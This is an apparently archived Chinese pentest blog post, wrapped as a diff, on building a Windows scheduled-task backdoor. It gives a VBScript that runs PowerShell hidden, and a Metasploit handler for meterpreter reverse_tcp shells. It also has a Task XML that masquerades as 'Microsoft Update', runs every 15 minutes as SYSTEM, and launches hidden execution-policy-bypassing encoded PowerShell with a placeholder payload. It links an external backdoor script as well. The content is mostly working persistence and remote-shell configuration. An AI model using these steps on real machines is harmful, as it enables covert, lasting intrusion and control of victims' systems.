@@ -1,0 +1,420 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>powershell定时任务后门 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="windows下查询定时任务，会出现无法加载列资源的情况：
+https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1
+chcp 437  &amp;#x2F;&amp;#x2F;cmd执行之后，切换到英文的cmd
+
+schtasks &amp;#x2F;query  &amp;#x2F;&amp;#x2F;列出所有task
+schtasks &amp;#x2F;query &amp;#x2F;xml  &amp;#x2F;&amp;#x2F;列出所有xml文件格式的定时任务
+schtasks &amp;#x2F;query &amp;#x2F;xml &amp;#x2F;TN &amp;#39;name&amp;#39; &amp;#x2F;&amp;#x2F;列出某个任务的详细信息（TN: TaskName)
+schtasks &amp;#x2F;delete &amp;#x2F;TN  &amp;quot;name&amp;quot; &amp;#x2F;&amp;#x2F;删除某个定时任务，这个名字可以再query的时候找到, &amp;#x2F;f 强制删除
+
+
+一种是定时任务，但是执行powershell的时候会弹窗https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work
+https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/设置userid   NT AUTHORITY\SYSTEM 即可
+Dim shell,command
+command &amp;#x3D; &amp;quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&amp;quot;
+set shell &amp;#x3D; CreateObject(&amp;quot;WScript.Shell&amp;quot;)
+shell.Run command,0
+
+msf接收多个shell可以如下这样做：
+use exploit&amp;#x2F;multi&amp;#x2F;handler
+set PAYLOAD windows&amp;#x2F;meterpreter&amp;#x2F;reverse_tcp
+set LHOST 192.168.1.117
+set LPORT 31337
+set ExitOnSession false
+exploit -j -z
+
+或者上面的保存为listener.rc，然后msfconsole启动
+msfconsole -r .&amp;#x2F;listener.rc
+
+XML文件如下:"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="powershell定时任务后门"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> powershell定时任务后门</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>windows下查询定时任务，会出现无法加载列资源的情况：</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
+<pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmd执行之后，切换到英文的cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;列出所有task
+schtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;列出所有xml文件格式的定时任务
+schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;列出某个任务的详细信息（TN: TaskName)
+schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;删除某个定时任务，这个名字可以再query的时候找到, &#x2F;f 强制删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>一种是定时任务，但是执行powershell的时候会弹窗<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>设置userid   <UserId>NT AUTHORITY\SYSTEM</UserId> 即可</p>
+<pre class="line-numbers language-none"><code class="language-none">Dim shell,command
+command &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;
+set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)
+shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>msf接收多个shell可以如下这样做：</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
+set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp
+set LHOST 192.168.1.117
+set LPORT 31337
+set ExitOnSession false
+exploit -j -z
+
+或者上面的保存为listener.rc，然后msfconsole启动
+msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>XML文件如下:</p>
+<pre class="line-numbers language-none"><code class="language-none">&lt;!-- \Microsoft Update --&gt;
+
+&lt;Task version&#x3D;&quot;1.2&quot; xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;windows&#x2F;2004&#x2F;02&#x2F;mit&#x2F;task&quot;&gt;
+
+  &lt;RegistrationInfo&gt;
+
+    &lt;Date&gt;2016-05-25T11:22:53&lt;&#x2F;Date&gt;
+
+    &lt;Author&gt;Microsoft Update&lt;&#x2F;Author&gt;
+
+  &lt;&#x2F;RegistrationInfo&gt;
+
+  &lt;Triggers&gt;
+
+    &lt;TimeTrigger&gt;
+
+      &lt;Repetition&gt;
+
+        &lt;Interval&gt;PT15M&lt;&#x2F;Interval&gt;
+
+        &lt;StopAtDurationEnd&gt;false&lt;&#x2F;StopAtDurationEnd&gt;
+
+      &lt;&#x2F;Repetition&gt;
+
+      &lt;StartBoundary&gt;2017-05-30T18:22:52&lt;&#x2F;StartBoundary&gt;
+
+      &lt;Enabled&gt;true&lt;&#x2F;Enabled&gt;
+
+    &lt;&#x2F;TimeTrigger&gt;
+
+  &lt;&#x2F;Triggers&gt;
+
+  &lt;Principals&gt;
+
+    &lt;Principal id&#x3D;&quot;Author&quot;&gt;
+
+      &lt;UserId&gt;NT AUTHORITY\SYSTEM&lt;&#x2F;UserId&gt;
+
+      &lt;LogonType&gt;InteractiveToken&lt;&#x2F;LogonType&gt;
+
+      &lt;RunLevel&gt;LeastPrivilege&lt;&#x2F;RunLevel&gt;
+
+    &lt;&#x2F;Principal&gt;
+
+  &lt;&#x2F;Principals&gt;
+
+  &lt;Settings&gt;
+
+    &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;&#x2F;MultipleInstancesPolicy&gt;
+
+    &lt;DisallowStartIfOnBatteries&gt;true&lt;&#x2F;DisallowStartIfOnBatteries&gt;
+
+    &lt;StopIfGoingOnBatteries&gt;true&lt;&#x2F;StopIfGoingOnBatteries&gt;
+
+    &lt;AllowHardTerminate&gt;true&lt;&#x2F;AllowHardTerminate&gt;
+
+    &lt;StartWhenAvailable&gt;false&lt;&#x2F;StartWhenAvailable&gt;
+
+    &lt;RunOnlyIfNetworkAvailable&gt;false&lt;&#x2F;RunOnlyIfNetworkAvailable&gt;
+
+    &lt;IdleSettings&gt;
+
+      &lt;StopOnIdleEnd&gt;true&lt;&#x2F;StopOnIdleEnd&gt;
+
+      &lt;RestartOnIdle&gt;false&lt;&#x2F;RestartOnIdle&gt;
+
+    &lt;&#x2F;IdleSettings&gt;
+
+    &lt;AllowStartOnDemand&gt;true&lt;&#x2F;AllowStartOnDemand&gt;
+
+    &lt;Enabled&gt;true&lt;&#x2F;Enabled&gt;
+
+    &lt;Hidden&gt;false&lt;&#x2F;Hidden&gt;
+
+    &lt;RunOnlyIfIdle&gt;false&lt;&#x2F;RunOnlyIfIdle&gt;
+
+    &lt;WakeToRun&gt;false&lt;&#x2F;WakeToRun&gt;
+
+    &lt;ExecutionTimeLimit&gt;P3D&lt;&#x2F;ExecutionTimeLimit&gt;
+
+    &lt;Priority&gt;7&lt;&#x2F;Priority&gt;
+
+  &lt;&#x2F;Settings&gt;
+
+  &lt;Actions Context&#x3D;&quot;Author&quot;&gt;
+
+    &lt;Exec&gt;
+
+      &lt;Command&gt;powershell.exe&lt;&#x2F;Command&gt;
+
+      &lt;Arguments&gt;-exec bypass -nop -WindowStyle hidden -e [payload]&lt;&#x2F;Arguments&gt;
+
+    &lt;&#x2F;Exec&gt;
+
+  &lt;&#x2F;Actions&gt;
+
+&lt;&#x2F;Task&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2017/05/24/schtasks%E5%AE%9A%E6%97%B6%E5%90%8E%E9%97%A8.html" class="leancloud-visitors view" data-flag-title="powershell定时任务后门">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2017/07/12/wmi.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2017/05/23/xss-get-ip.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2017-05-24 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
